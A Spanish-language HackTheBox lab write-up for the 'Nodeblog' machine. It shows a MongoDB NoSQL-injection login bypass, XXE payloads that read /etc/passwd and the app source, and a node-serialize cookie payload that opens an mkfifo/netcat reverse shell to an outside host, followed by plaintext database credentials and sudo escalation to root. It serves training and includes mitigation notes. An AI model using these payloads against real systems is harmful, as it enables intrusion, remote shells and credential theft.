---
layout: post
render_with_liquid: false
title: "HTB Writeup: Nodeblog"
date: 2026-04-23
category: writeups
tags: [htb, linux, easy, nosql-injection, mongodb, xxe, node-serialize, deserialization, rce]
platform: HackTheBox
os: Linux
difficulty: Easy
has_exploits: true
exploits_url: /writeups/nodeblog/exploit/
resumen: "NoSQL Injection para bypass de autenticación en MongoDB. XXE en endpoint XML para exfiltrar server.js y descubrir deserialización insegura con node-serialize. RCE mediante IIFE en cookie de sesión. Escalada vía credenciales en texto plano en MongoDB y sudo (ALL) ALL."
permalink: /writeups/nodeblog/
---

| Propiedad  | Valor      |
| :--------- | :--------- |
| Plataforma | HackTheBox |
| OS         | Linux      |
| Dificultad | Easy       |
| Autor      | Ghostvyle  |

### Temas Tratados

- **Reconocimiento:** Nmap, Gobuster, análisis de aplicación Node.js/Express
- **Explotación:** NoSQL Injection (operador `$ne` en MongoDB), XXE (lectura de archivos del sistema vía upload XML), node-serialize Deserialization RCE (IIFE en cookie `auth`)
- **Escalada:** Credenciales en texto plano en MongoDB, `sudo (ALL) ALL`

## Sinopsis

Máquina Linux con una aplicación de blog construida sobre **Node.js/Express** y **MongoDB**. El formulario de login acepta `Content-Type: application/json`, lo que permite inyectar operadores de MongoDB y saltarse la autenticación con **NoSQL Injection**. Una vez dentro, el endpoint de importación de artículos XML parsea entidades externas sin restricciones (**XXE**), lo que permite leer el código fuente de la aplicación. En `server.js` descubrimos que la función de autenticación llama a `node-serialize.unserialize()` sobre la cookie `auth` **antes** de validar la firma. Si la cookie contiene una función JavaScript con el sufijo `()`, se ejecuta inmediatamente durante la deserialización (**IIFE**). Construimos el payload, lo enviamos como cookie y obtenemos una shell como `admin`. La escalada a **root** se consigue extrayendo las credenciales en texto plano de **MongoDB** y aprovechando un `sudo` sin ninguna restricción.

---

## Reconocimiento

### Escaneo de puertos

Comenzamos con un escaneo SYN completo de los 65535 puertos TCP:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.96.160 -oG allPorts
```

| Parámetro          | Descripción                                               |
| :----------------- | :-------------------------------------------------------- |
| `-p-`              | Escanea los 65535 puertos TCP                             |
| `--open`           | Muestra únicamente los puertos abiertos                   |
| `-sS`              | SYN Scan (half-open, más rápido y sigiloso)               |
| `--min-rate 5000`  | Envía mínimo 5000 paquetes por segundo                    |
| `-vvv`             | Máxima verbosidad durante el escaneo                      |
| `-n`               | Desactiva la resolución DNS                               |
| `-Pn`              | No realiza descubrimiento de host (asume que está activo) |
| `-oG allPorts`     | Exporta los resultados en formato grepeable               |

![Descubrimiento de puertos abiertos con nmap](/writeups/nodeblog/assets/01_nmap_all_ports.png)

La máquina expone únicamente dos puertos:

| Puerto    | Servicio | Versión                          |
| :-------- | :------- | :------------------------------- |
| 22/tcp    | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3  |
| 5000/tcp  | HTTP     | Node.js Express — título "Blog"  |

El puerto 5000 ejecuta directamente un proceso **Node.js/Express** sin proxy inverso. La exposición directa del runtime nos indica que estamos ante una aplicación custom que puede presentar vulnerabilidades en la lógica de negocio.

### Enumeración web con Gobuster

```bash
gobuster dir -u http://10.129.96.160:5000 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50
```

![Fuzzing de directorios con Gobuster](/writeups/nodeblog/assets/02_gobuster_dirs.png)

| Ruta        | Código | Observación                        |
| :---------- | :----- | :--------------------------------- |
| `/login`    | 200    | Formulario de autenticación        |
| `/user`     | 302    | Redirige — requiere autenticación  |
| `/articles` | 200    | Sección de artículos del blog      |

### Exploración de la aplicación web

Accedemos a `http://10.129.96.160:5000` y encontramos un blog con formulario de login. Al visitar `/articles` sin especificar un path, el servidor devuelve un error que revela información interna:

![Error en /articles que expone la ruta de las vistas EJS](/writeups/nodeblog/assets/06_articles_path_error.png)

```
Error: Failed to lookup view "articles/${path}" in views directory "/opt/blog/views"
```

Confirmamos que la aplicación reside en `/opt/blog/` y usa **EJS** como motor de plantillas. El path de la URL se concatena directamente en la ruta de la vista sin sanear.

---

## Explotación

### NoSQL Injection — Bypass de autenticación

El formulario de login envía las credenciales como `application/x-www-form-urlencoded` por defecto. Sin embargo, la aplicación tiene habilitado el middleware `express.json()`, lo que significa que también acepta `Content-Type: application/json` y parsea el body como un **objeto JavaScript completo** en lugar de como strings planos.

En lugar de enviar `user=admin&password=test`, podemos inyectar **operadores de MongoDB**. El operador `$ne` significa *"not equal"*:

```json
{
    "user": {"$ne": null},
    "password": {"$ne": null}
}
```

Esto transforma la query interna en: *"dame cualquier usuario cuyo campo `user` no sea null Y cuyo `password` no sea null"* — devuelve cualquier registro de la colección.

Capturamos la petición en Burp Suite, cambiamos el `Content-Type` a `application/json` y enviamos el payload:

```http
POST /login HTTP/1.1
Host: 10.129.96.160:5000
Content-Type: application/json

{"user":{"$ne":null},"password":{"$ne":null}}
```

![Bypass de autenticación con NoSQL Injection — respuesta 200 OK](/writeups/nodeblog/assets/03_nosql_login_bypass.png)

El servidor devuelve **200 OK** con la cookie de sesión `auth`. Autenticación bypasseada.

![Blog accesible tras el bypass — botones New Article y Upload](/writeups/nodeblog/assets/04_blog_authenticated.png)

Accedemos al blog autenticados con los botones **New Article** y **Upload** visibles.

![Formulario de creación de artículos](/writeups/nodeblog/assets/05_new_article_form.png)

> **NoSQL Injection**: a diferencia de SQL injection donde se rompe la sintaxis de un string, aquí se inyectan operadores del lenguaje de queries de MongoDB directamente en el objeto JavaScript. El problema es estructural: la aplicación pasa los parámetros del usuario directamente al driver sin validar que sean strings simples.

### XXE — Lectura del código fuente

El botón **Upload** acepta archivos XML con la estructura del blog. La petición se envía como `POST /articles/xml` con `multipart/form-data`. Si el parser tiene las **entidades externas habilitadas**, es vulnerable a **XXE**.

Verificamos el vector leyendo `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<post>
    <title>&myFile;</title>
    <description>test</description>
    <markdown>test</markdown>
</post>
```

![Upload del payload XXE para /etc/passwd](/writeups/nodeblog/assets/07_xxe_upload_payload.png)

![Contenido de /etc/passwd exfiltrado en el título del artículo](/writeups/nodeblog/assets/08_xxe_passwd_result.png)

El contenido completo de `/etc/passwd` aparece en el título del artículo renderizado. **XXE confirmado.** El usuario con shell interactiva es `admin` (uid=1000).

Ahora leemos el código fuente de la aplicación en `/opt/blog/server.js`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///opt/blog/server.js">]>
<post>
    <title>&myFile;</title>
    <description>test</description>
    <markdown>test</markdown>
</post>
```

La sección de autenticación revela una **vulnerabilidad crítica**:

```javascript
const serialize = require('node-serialize')
const cookie_secret = "UHC-SecretCookie"

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)        // ← deserializa ANTES de validar la firma

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    }
}

app.get('/', async (req, res) => {
    res.render('articles/index', { authenticated: authenticated(req.cookies.auth) })
})
```

El servidor llama a `serialize.unserialize()` sobre la cookie `auth` en **cada `GET /`**, y lo hace **antes** de verificar la firma. Cualquier visita con una cookie maliciosa desencadena la deserialización sin ninguna comprobación de integridad previa.

### node-serialize Deserialization RCE

La librería `node-serialize` usa el prefijo `_$$ND_FUNC$$_` para marcar funciones serializadas. Si el valor termina en `()`, la función se convierte en un **IIFE** y se ejecuta automáticamente al deserializar.

El payload de reverse shell:

```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.178 4444 >/tmp/f',function(error,stdout,stderr){});}()"}
```

URL-encodeamos el JSON completo y lo enviamos como valor de la cookie `auth`. Antes levantamos el listener:

```bash
nc -lvnp 4444
```

![Envío del payload de deserialización con la cookie maliciosa](/writeups/nodeblog/assets/09_deserialization_payload.png)

![Shell recibida como admin](/writeups/nodeblog/assets/10_shell_as_admin.png)

Recibimos la shell como `admin`.

> **¿Por qué mkfifo en lugar de `bash -i >&`?**: En Ubuntu 20.04, `/bin/sh` apunta a `dash`, que no soporta el operador `>&` de bash. El named pipe (`mkfifo`) crea un FIFO en disco que actúa como canal bidireccional sin depender de esa sintaxis.

---

## Post-Explotación

### Flag de usuario

Al intentar acceder al directorio home nos encontramos con una anomalía:

```bash
ls -la /home/
# drw-r--r--  5 admin admin 4096 ...  admin    ← sin bit 'x'
```

El directorio `/home/admin` tiene permisos `drw-r--r--` — **falta el bit de ejecución**. Sin el bit `x` en un directorio, el sistema deniega el traversal aunque el propietario tenga `r`.

```bash
chmod +x /home/admin
cd /home/admin
cat user.txt
```

![Flag de usuario tras restaurar el bit de ejecución en el directorio](/writeups/nodeblog/assets/11_user_flag.png)

> **Bit `x` en directorios**: en ficheros, `x` significa ejecución del binario. En directorios, significa permiso de *traversal* — poder entrar y acceder a los contenidos. Con `r` pero sin `x` podemos listar los nombres de los ficheros, pero no acceder a ninguno.

---

## Escalada de Privilegios

### Enumeración del sistema

Comprobamos los binarios con SUID:

```bash
find / -type f -perm -4000 2>/dev/null
```

![Binarios con SUID — /usr/bin/at pertenece a daemon, no a root](/writeups/nodeblog/assets/12_suid_search.png)

`/usr/bin/at` tiene SUID pero es propiedad de `daemon`, no de `root`. No es útil para escalar.

### Credenciales en MongoDB

La aplicación se conecta a MongoDB en localhost. Accedemos directamente a la base de datos:

```bash
mongo blog --eval "db.users.find().pretty()"
```

![Credenciales del usuario admin en texto plano en MongoDB](/writeups/nodeblog/assets/13_mongodb_credentials.png)

```json
{
    "username" : "admin",
    "password" : "IppsecSaysPleaseSubscribe"
}
```

Las contraseñas se almacenan en **texto plano**. Credenciales: `admin:IppsecSaysPleaseSubscribe`.

### sudo — Escalada a root

Obtenemos una TTY antes de ejecutar `sudo`:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
# Password: IppsecSaysPleaseSubscribe
```

![sudo -l muestra (ALL) ALL sin restricciones](/writeups/nodeblog/assets/14_sudo_l.png)

```
User admin may run the following commands on nodeblog:
    (ALL) ALL
    (ALL : ALL) ALL
```

El usuario `admin` puede ejecutar cualquier comando como cualquier usuario. La escalada es inmediata:

```bash
sudo su
```

![Shell como root](/writeups/nodeblog/assets/15_root_shell.png)

Somos **root** en la máquina Nodeblog.

---

## Conceptos clave

### NoSQL Injection

MongoDB usa su propio lenguaje de queries con operadores como `$ne`, `$gt` o `$regex`. Si la aplicación pasa los parámetros del usuario directamente al driver sin validar que sean strings simples, se pueden inyectar esos operadores y manipular la lógica de la consulta. El vector clave aquí es el `Content-Type: application/json` que permite enviar objetos completos en lugar de strings planos.

### XXE (XML External Entity)

Cuando un parser XML tiene habilitadas las entidades externas (configuración por defecto en muchas librerías), se puede definir una entidad que apunte a un archivo del sistema con `SYSTEM "file:///ruta"`. Al referenciarla en el XML, el parser la resuelve leyendo el archivo e incluyendo su contenido en el documento resultante. La mitigación es deshabilitar `LIBXML_NOENT` o el equivalente en el parser utilizado.

### node-serialize Deserialization RCE

`node-serialize` permite serializar funciones JavaScript con el prefijo `_$$ND_FUNC$$_`. Al deserializar, si el valor termina en `()`, la función se ejecuta inmediatamente (IIFE). **Nunca se debe llamar a `unserialize()` sobre datos controlados por el usuario.** El fallo aquí es doble: usar una librería que ejecuta código al deserializar, y hacerlo antes de cualquier validación.

### Almacenamiento de contraseñas en texto plano

Guardar contraseñas sin cifrar en la base de datos convierte cualquier acceso de lectura (SQL injection, SSRF, credenciales comprometidas) en una filtración total. Las contraseñas deben almacenarse siempre con un algoritmo de hashing de contraseñas adecuado como `bcrypt` o `argon2`, con sal individual por usuario.

---

## Resumen del ataque

```
Reconocimiento (nmap) → 22/tcp (SSH) | 5000/tcp (Node.js Express)
    ↓
Enumeración web (gobuster) → /login | /user | /articles
    ↓
NoSQL Injection — Content-Type: application/json + {"user":{"$ne":null}}
    → Bypass de autenticación → Cookie auth obtenida
    ↓
XXE en POST /articles/xml
    → file:///etc/passwd → usuario: admin (uid=1000)
    → file:///opt/blog/server.js → node-serialize + unserialize() antes de validar
    ↓
node-serialize Deserialization RCE — IIFE en cookie auth
    → Shell como admin
    ↓
chmod +x /home/admin → user.txt ✓
    ↓
mongo blog → admin:IppsecSaysPleaseSubscribe (texto plano)
    ↓
sudo -l → (ALL) ALL → sudo su → root ✓
```

---
